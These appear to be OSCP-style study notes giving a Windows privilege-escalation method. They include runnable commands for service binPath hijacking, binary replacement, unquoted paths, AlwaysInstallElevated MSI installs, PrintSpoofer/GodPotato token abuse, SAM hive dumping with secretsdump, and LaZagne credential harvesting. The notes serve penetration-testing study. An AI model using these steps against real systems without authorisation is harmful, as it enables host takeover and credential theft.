# Escalate privileges on Windows

[Overview](../START.canvas) · [Browser map](../Map.html)

An administrator-group membership, enabled token privilege, writable object and effective privileged execution are different claims. Establish the precise right, consumer identity and available trigger before choosing a route.

## windows-state

### Establish Windows token, host and process context

**Enter:** A new Windows session or claimed administrator/SYSTEM transition

**Discovery**

```text
whoami /all
systeminfo
tasklist /svc
```

**Interpret:** An Administrators SID exists but this effective process is filtered/medium-integrity.

**Still check:** Check actual enabled privileges and object operations in the process that will perform the action.

**Verify:** Verify represented user/SID, enabled group/privilege state and actual privileged operation.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-state)

### Full procedure and variants

```cmd
hostname
whoami /all
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
query user
net user
net localgroup Administrators
driverquery /v
```

```powershell
Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
Get-HotFix | Sort-Object InstalledOn -Descending
Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName
Get-LocalUser
Get-LocalGroupMember Administrators
```

> **Interpret:** record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. `Get-HotFix` does not list every update; use build/KB output only to form a version hypothesis.

<details>
<summary><strong>WMIC compatibility fallbacks</strong></summary>

```cmd
wmic qfe get HotFixID,InstalledOn
wmic service get Name,StartName,State,StartMode,PathName
wmic process get ProcessId,Name,ExecutablePath,CommandLine
```

> WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.

</details>

```cmd
whoami /all
hostname
ipconfig /all
```

After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase.

### Follow the evidence

- [ Prove effective file, registry and service-object permissions](windows-privesc.md#windows-acl) — A privileged object appears writable or an ACL tool reports a useful right Required: Correct trustee/token, object type and effective rights including parents and deny entries
- [ Change a privileged service's executable configuration](windows-privesc.md#windows-service-config) — Effective SERVICE_CHANGE_CONFIG on a higher-privileged service Required: Configuration-change right, accessible compatible payload path and a separate start/restart trigger
- [ Select a privilege-backed impersonation or object-control route](windows-privesc.md#windows-token) — whoami /priv exposes a relevant token privilege Required: The exact privilege and usable operation; impersonation additionally needs a compatible privileged authentication source, OS/service state and executable context
- [ Exploit an unquoted service path with a writable earlier prefix](windows-privesc.md#windows-unquoted) — A service command line contains unquoted spaces Required: An earlier executable prefix is absent and creatable, service identity is higher and a start/restart trigger exists
- [ Validate elevated installer policy and administrative-token context](windows-privesc.md#windows-installer) — Installer policy values or an administrator account with a filtered token Required: AlwaysInstallElevated requires both effective machine/user policy values and permitted MSI execution; UAC routes require their own compatible administrator/token context
## windows-acl

### Prove effective file, registry and service-object permissions

**Enter:** A privileged object appears writable or an ACL tool reports a useful right

**Discovery**

```text
icacls "C:\Path\To\OBJECT"
icacls "C:\Path\To"
sc.exe sdshow SERVICE
```

**Interpret:** A modifiable parent can differ from a read-only file; service configuration rights are another control plane.

**Still check:** Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger.

**Verify:** Name the exact allowed operation on the exact object and independently check a privileged consumer/trigger.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-acl)

### Full procedure and variants

```cmd
icacls "C:\Path\To\OBJECT"
sc.exe sdshow SERVICE
accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
```

`icacls` common rights: `F` full, `M` modify, `RX` read/execute, `R` read, `W` write, `D` delete. Common inheritance markers: `I`, `OI`, `CI`, `IO`, `NP`.

> File, directory, registry, service-object, task and process permissions are separate. Check whether the ACE applies to the current user or an enabled group and grants the exact required operation. Mandatory Integrity Control can still block a lower-integrity write.

### Follow the evidence

- [ Replace a privileged service binary or consumed file](windows-privesc.md#windows-service-binary) — A privileged service consumes a file whose bytes or parent replacement are controllable Required: Effective file/parent replacement rights, compatible artifact, file-lock handling and available privileged restart/boot trigger
- [ Control scheduled tasks, startup files or autostart consumers](windows-privesc.md#windows-tasks) — A task/startup action consumes a writable command, file, directory or registry value Required: Effective object control, a higher principal and a usable scheduled/logon/manual trigger
- [ Control a privileged DLL, helper or configuration load](windows-privesc.md#windows-dll) — A privileged application searches for a missing dependency or consumes writable configuration Required: Actual controlled resolution path, compatible name/architecture/exports and a reliable privileged load trigger
## windows-secrets

### Recover Windows application, history and stored-credential artifacts

**Enter:** Readable application configuration, unattended setup, PowerShell trails or Credential Manager entries

**Discovery**

```text
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

**Interpret:** A target-bound saved credential is a possible consumer capability, not a plaintext password.

**Still check:** Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route.

**Verify:** Tie each value to a source/account/service and verify any new token with whoami /all.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-secrets)

### Full procedure and variants

##### Stored credentials and PowerShell trails

```cmd
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

```powershell
$history = (Get-PSReadLineOption).HistorySavePath
$history
Get-Content -LiteralPath $history -ErrorAction SilentlyContinue
Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue |
  Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message
```

> A `cmdkey` entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. `Clear-History` does not necessarily clear PSReadLine's saved file.

<details>
<summary><strong>Targeted application/file/registry search</strong></summary>

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul
```

```powershell
Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } |
  Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false
```

> Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure.

</details>

<details>
<summary><strong>Saved credential consumer</strong></summary>

```cmd
runas /savecred /user:DOMAIN\USER cmd.exe
```

> Use only when `cmdkey`/context supports that identity and logon type. `runas` does not inherently bypass UAC; verify the resulting token with `whoami /all`.

</details>

<details>
<summary><strong>LaZagne — recover application credentials in the current user's context</strong></summary>

Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token.

```cmd
REM Browser-store leads for the current user
laZagne.exe browsers

REM Broader recovery, with a local text report
laZagne.exe all -oN
```

> **Read:** preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials.

[LaZagne upstream](https://github.com/AlessandroZ/LaZagne).

</details>

```powershell
Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -match 'pass|cred|config|backup|unattend|\.env' }
```

```powershell
Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd' } |
  Select-String -Pattern 'password|passwd|secret|token|connectionString' -CaseSensitive:$false
```

Avoid searching the entire filesystem without a reason; scope reduces noise, access errors and sensitive-data overcollection.

### Follow the evidence

- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Use Credential Manager and DPAPI with the protecting context](ad-identities.md#ad-dpapi) — Saved credentials or protected application blobs/master keys Required: Access to the protected data plus matching user/machine context, master-key material or an appropriate recovery factor
## windows-service-config

### Change a privileged service's executable configuration

**Enter:** Effective SERVICE_CHANGE_CONFIG on a higher-privileged service

**Discovery**

```text
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
sc.exe qc SERVICE
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
```

**Interpret:** Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them.

**Still check:** Use sc qc to read the service account and command, sc sdshow/AccessChk to verify configuration rights and sc query to inspect state. Confirm an allowed start/restart trigger before changing the service, then verify whoami.

**Verify:** Verify the payload's effect and service execution identity, then restore the saved configuration.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-service-config)

### Full procedure and variants

```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
```

```cmd
sc.exe qc SERVICE
sc.exe sdshow SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe"
```

> **Need:** control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher `SERVICE_START_NAME`; and a start/restart/boot trigger. In PowerShell use `sc.exe`, because bare `sc` can resolve to `Set-Content`.

Preserve `BINARY_PATH_NAME`, account and start mode first:

```cmd
sc.exe qc SERVICE
sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE"
sc.exe stop SERVICE
sc.exe start SERVICE
```

Restore:

```cmd
sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH"
```

> `SERVICE_CHANGE_CONFIG` controls `binPath`; start/stop are separate rights. The space after `binPath=` is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.

<details>
<summary><strong>Writable service binary or replaceable parent</strong></summary>

```cmd
sc.exe qc SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"
copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
sc.exe stop SERVICE
sc.exe start SERVICE
```

> A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.

</details>

### Follow the evidence

- [ Use Windows authenticated access or a PowerShell command channel](sessions-transfers.md#session-windows) — Windows execution or valid credentials with an available remote service Required: Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Control scheduled tasks, startup files or autostart consumers](windows-privesc.md#windows-tasks) — A task/startup action consumes a writable command, file, directory or registry value Required: Effective object control, a higher principal and a usable scheduled/logon/manual trigger
## windows-service-binary

### Replace a privileged service binary or consumed file

**Enter:** A privileged service consumes a file whose bytes or parent replacement are controllable

**Discovery**

```text
sc.exe qc SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"
```

**Interpret:** A higher-identity service consumes a potentially replaceable file in a modifiable directory.

**Still check:** Use sc qc to locate the real binary and account, then icacls on that file and its parent. Confirm replacement rights and an available privileged service start/restart; a writable unrelated file is insufficient.

**Verify:** Prove actual selected file, trigger and resulting token; retain the recovery copy privately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-service-binary)

### Full procedure and variants

<details>
<summary><strong>Writable service binary or replaceable parent</strong></summary>

```cmd
sc.exe qc SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"
copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
sc.exe stop SERVICE
sc.exe start SERVICE
```

> A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.

</details>

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Prove effective file, registry and service-object permissions](windows-privesc.md#windows-acl) — A privileged object appears writable or an ACL tool reports a useful right Required: Correct trustee/token, object type and effective rights including parents and deny entries
## windows-unquoted

### Exploit an unquoted service path with a writable earlier prefix

**Enter:** A service command line contains unquoted spaces

**Discovery**

```text
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
```

**Interpret:** Spaces plus absent executable quoting create candidate earlier prefixes; writable placement and trigger remain unproved.

**Still check:** Read the unquoted service command with sc qc. Check each earlier executable prefix for write/create access with icacls; confirm the service account and restart trigger. Spaces alone do not make the path exploitable.

**Verify:** Confirm the earlier prefix is actually selected after the trigger and verify its resulting token.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-unquoted)

### Full procedure and variants

```powershell
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } |
  Select-Object Name,StartName,State,StartMode,PathName
```

For `C:\Program Files\Vendor App\service.exe -d`, check every attempted prefix:

```cmd
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Vendor App"
sc.exe qc SERVICE
```

> **Confirmed only if:** path contains spaces and is unquoted; an earlier attempted executable such as `C:\Program.exe` or `C:\Program Files\Vendor.exe` is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive.

### Follow the evidence

- [ Prove effective file, registry and service-object permissions](windows-privesc.md#windows-acl) — A privileged object appears writable or an ACL tool reports a useful right Required: Correct trustee/token, object type and effective rights including parents and deny entries
- [ Replace a privileged service binary or consumed file](windows-privesc.md#windows-service-binary) — A privileged service consumes a file whose bytes or parent replacement are controllable Required: Effective file/parent replacement rights, compatible artifact, file-lock handling and available privileged restart/boot trigger
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
## windows-dll

### Control a privileged DLL, helper or configuration load

**Enter:** A privileged application searches for a missing dependency or consumes writable configuration

**Discovery**

```text
Procmon, when accessible: filter the actual process; inspect requested .dll paths and NAME NOT FOUND results.
Record the exact requested filename and every searched location.
Then inspect the selected location's effective ACL with the owning procedure.
```

**Interpret:** An actual requested missing dependency is stronger than guessing a DLL name, but does not prove an attacker-controlled resolution wins.

**Still check:** Validate real privilege, search precedence/KnownDLLs/manifests, directory control, ABI/exports and a load trigger.

**Verify:** Verify the actual loaded path and privileged effect; a file placed on disk is not a completed chain.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-dll)

### Full procedure and variants

Confirm:

1. exact DLL/helper/config name and architecture;
2. privileged process actually requests it;
3. selected attacker-writable location precedes the legitimate resolution;
4. payload preserves required exports/behavior where necessary;
5. reliable trigger exists.

```cmd
icacls "C:\Path\To\Application"
sc.exe qc SERVICE
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
```

> Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, `CreateFile`, `.dll`, and `NAME NOT FOUND` provide decisive runtime evidence; low-privilege remote use may be unavailable.

### Follow the evidence

- [ Compile and minimally adapt an existing native or memory-corruption PoC](public-exploits.md#exploit-compile) — An existing C/C++ or platform-specific PoC matches the candidate Required: Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants
- [ Prove effective file, registry and service-object permissions](windows-privesc.md#windows-acl) — A privileged object appears writable or an ACL tool reports a useful right Required: Correct trustee/token, object type and effective rights including parents and deny entries
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
## windows-tasks

### Control scheduled tasks, startup files or autostart consumers

**Enter:** A task/startup action consumes a writable command, file, directory or registry value

**Discovery**

```text
schtasks /query /fo LIST /v
schtasks /query /tn "\FOLDER\TASK" /xml
```

**Interpret:** A named privileged task exposes a concrete consumer and action path to investigate.

**Still check:** Read the task's exact action, principal and trigger with schtasks or Get-ScheduledTask. Check icacls on its file/parents and prove the stronger identity will consume the controlled path at a reachable trigger.

**Verify:** Check the actual effect and token after the trigger; task-run acceptance alone is insufficient.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-tasks)

### Full procedure and variants

##### Scheduled tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /tn "\FOLDER\TASK" /xml
```

```powershell
Get-ScheduledTask | ForEach-Object {
  $t = $_
  [pscustomobject]@{
    TaskPath=$t.TaskPath; TaskName=$t.TaskName
    UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel
    Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; '
  }
}
```

```cmd
icacls "C:\Path\To\task-script.ps1"
icacls "C:\Path\To"
schtasks /run /tn "\FOLDER\TASK"
```

> Prove action, arguments, working directory, principal, actual trigger and effective ACL. `RunLevel Highest` means the configured principal's highest available token, not SYSTEM. `/run` success means the request was accepted; verify process/effect and last-run result.

<details>
<summary><strong>Run keys and startup consumers</strong></summary>

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

> Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH.

</details>

### Follow the evidence

- [ Prove effective file, registry and service-object permissions](windows-privesc.md#windows-acl) — A privileged object appears writable or an ACL tool reports a useful right Required: Correct trustee/token, object type and effective rights including parents and deny entries
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Change a privileged service's executable configuration](windows-privesc.md#windows-service-config) — Effective SERVICE_CHANGE_CONFIG on a higher-privileged service Required: Configuration-change right, accessible compatible payload path and a separate start/restart trigger
## windows-installer

### Validate elevated installer policy and administrative-token context

**Enter:** Installer policy values or an administrator account with a filtered token

**Discovery**

```text
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
whoami /all
```

**Interpret:** One policy value is insufficient; the two-policy conjunction is the key recognition condition.

**Still check:** For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately.

**Verify:** Verify both relevant conditions and actual resulting token; keep UAC-context claims narrower than full privilege escalation.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-installer)

### Full procedure and variants

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both values must be `0x1`:

```cmd
msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi
```

> One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass.

```cmd
whoami /groups
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

> A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user.

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Select a privilege-backed impersonation or object-control route](windows-privesc.md#windows-token) — whoami /priv exposes a relevant token privilege Required: The exact privilege and usable operation; impersonation additionally needs a compatible privileged authentication source, OS/service state and executable context
- [ Generate a payload matching OS, process, format and handler](sessions-transfers.md#payload-generate) — An existing exploit/delivery primitive needs a binary or raw payload Required: Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener
## windows-token

### Select a privilege-backed impersonation or object-control route

**Enter:** whoami /priv exposes a relevant token privilege

**Discovery**

```text
whoami /priv
whoami /all
```

**Interpret:** An impersonation capability is present; the privileged authentication source required by a specific tool is not established.

**Still check:** Read whoami /priv and whoami /all. Match the exact privilege, enabled state and token context to the technique's required API/trigger, then verify the resulting identity; the privilege name alone is not SYSTEM.

**Verify:** Verify the resulting token or concrete protected-object operation, not the tool's success text.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-token)

### Full procedure and variants

```cmd
whoami /priv
```

| Privilege | Required next proof |
| --- | --- |
| `SeImpersonatePrivilege` | Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation |
| `SeAssignPrimaryTokenPrivilege` | Useful primary token plus process/quota requirements |
| `SeBackupPrivilege` | Enabled privilege, backup-aware read and useful protected data |
| `SeRestorePrivilege` | Restore-aware write plus privileged consumer/trigger |
| `SeDebugPrivilege` | Usable target process and no protected-process barrier |
| `SeLoadDriverPrivilege` | Compatible signed/loadable driver and stable exploit path |
| `SeTakeOwnershipPrivilege` | Ownership change, then DACL/content control and consumer |

<details>
<summary><strong>Impersonation-tool variants</strong></summary>

```cmd
PrintSpoofer64.exe -i -c "cmd.exe"
```

```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt"
```

> Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by `whoami /all`; connection/token/process errors route back to prerequisites.

</details>

<details>
<summary><strong>Backup privilege to local credential material</strong></summary>

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM.hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```

```bash
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

> Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.

</details>

### Follow the evidence

- [ Use backup privilege to obtain protected local credential material](windows-privesc.md#windows-backup) — A token has the relevant backup rights and protected registry/files are a useful credential source Required: Usable backup privilege, compatible backup API/command and a matched protected source set with a writable destination
- [ Obtain accessible live logon-session credential material](ad-identities.md#ad-lsass) — A controlled Windows host may hold useful logged-on identities Required: Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material
- [ Select a matching application, driver or kernel exploit](windows-privesc.md#windows-kernel) — An exact vulnerable local component is present after simpler paths are assessed Required: Affected build/patch/architecture, required service/driver/configuration and compatible exploit assumptions
## windows-backup

### Use backup privilege to obtain protected local credential material

**Enter:** A token has the relevant backup rights and protected registry/files are a useful credential source

**Discovery**

```text
whoami /priv
```

**Interpret:** The privilege is assigned but initially disabled; permitted software may enable it for backup-semantic reads.

**Still check:** Check that the privilege can actually be used, supporting API/context, complete matched source set and writable output.

**Verify:** Verify complete matched source artifacts and exact account mapping after parsing.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-backup)

### Full procedure and variants

<details>
<summary><strong>Backup privilege to local credential material</strong></summary>

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM.hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```

```bash
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

> Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.

</details>

### Follow the evidence

- [ Extract local account hashes from matched SAM and SYSTEM](ad-identities.md#ad-sam) — Protected local registry material is available under sufficient host privilege Required: Matched SAM/SYSTEM from the same system and appropriate read/backup access
- [ Recover or reuse an NT password hash](credentials.md#nt-hash) — An NT verifier from an appropriate credential source Required: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
## windows-kernel

### Select a matching application, driver or kernel exploit

**Enter:** An exact vulnerable local component is present after simpler paths are assessed

**Discovery**

```text
Get-ComputerInfo | Select-Object OsBuildNumber,OsArchitecture
Get-HotFix
Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName
```

**Interpret:** The exact component/build is the candidate evidence; an OS-family name or one missing KB is insufficient.

**Still check:** Verify vendor patch state, required driver/service/feature, architecture and PoC assumptions.

**Verify:** Verify target hostname and resulting effective token; preserve reviewed PoC modifications privately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-kernel)

### Full procedure and variants

```powershell
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
                 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
  Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation
```

```cmd
systeminfo
driverquery /v
```

> Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid `Win32_Product`; it is slow and can trigger MSI repair.

### Follow the evidence

- [ Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select) — A product/version clue, advisory or component-specific public PoC Required: Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect
- [ Compile and minimally adapt an existing native or memory-corruption PoC](public-exploits.md#exploit-compile) — An existing C/C++ or platform-specific PoC matches the candidate Required: Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
## windows-enumerators

### Turn automated Windows findings into manually verified candidates

**Enter:** A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials

**Discovery**

```text
whoami /all
$PSVersionTable
$ExecutionContext.SessionState.LanguageMode
```

**Interpret:** The enumerator located a configuration clue, not the full usable chain.

**Still check:** Run winPEAS with log output, then inspect the exact reported service with sc qc/sc sdshow and its file with icacls. Check token highlights with whoami /priv. A collector's colored line is not the resulting elevated token.

**Verify:** Read out.txt or the helper report. Use sc.exe qc/sdshow plus icacls for a service, inspect task XML/run-as for a scheduled task, or check whoami /priv for a token finding

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/windows-privesc/#windows-enumerators)

### Full procedure and variants

```cmd
winPEASx64.exe log
Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt"
Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json"
```

```powershell
powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML"
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

> winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks.

Convert every highlight into:

```text
CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS
```

### Follow the evidence

- [ Prove effective file, registry and service-object permissions](windows-privesc.md#windows-acl) — A privileged object appears writable or an ACL tool reports a useful right Required: Correct trustee/token, object type and effective rights including parents and deny entries
- [ Change a privileged service's executable configuration](windows-privesc.md#windows-service-config) — Effective SERVICE_CHANGE_CONFIG on a higher-privileged service Required: Configuration-change right, accessible compatible payload path and a separate start/restart trigger
- [ Select a privilege-backed impersonation or object-control route](windows-privesc.md#windows-token) — whoami /priv exposes a relevant token privilege Required: The exact privilege and usable operation; impersonation additionally needs a compatible privileged authentication source, OS/service state and executable context
## S01

### Inspect host-side RDP enablement and logon policy

**Enter:** you have authorized local administrative or equivalent management access to a Windows destination, and RDP access is relevant or failing.

**Discovery**

```text

```

